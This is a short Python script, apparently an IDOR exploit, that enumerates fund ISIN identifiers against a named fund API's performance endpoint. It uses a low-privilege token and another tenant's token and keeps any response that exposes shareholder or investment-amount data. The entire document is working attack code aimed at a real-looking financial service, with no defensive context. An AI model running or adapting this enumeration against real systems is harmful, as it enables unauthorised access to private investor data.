import requests


def fund_idor(low_privilege_token, tenant_a_token):
    base_url = "https://api.nnip.com/funds/"
    results = []

    for i in range(671440, 671461):
        isin = f"LU0809{i}"
        for token in [low_privilege_token, tenant_a_token]:
            headers = {"Authorization": f"Bearer {token}"}
            response = requests.get(
                f"{base_url}{isin}/performance",
                headers=headers,
            )
            if response.status_code == 200:
                try:
                    json_data = response.json()
                    has_shareholders = "shareholders" in json_data
                    has_investment = "investment_amount" in json_data
                    if has_shareholders or has_investment:
                        results.append((isin, json_data))
                except ValueError:
                    continue

    return results
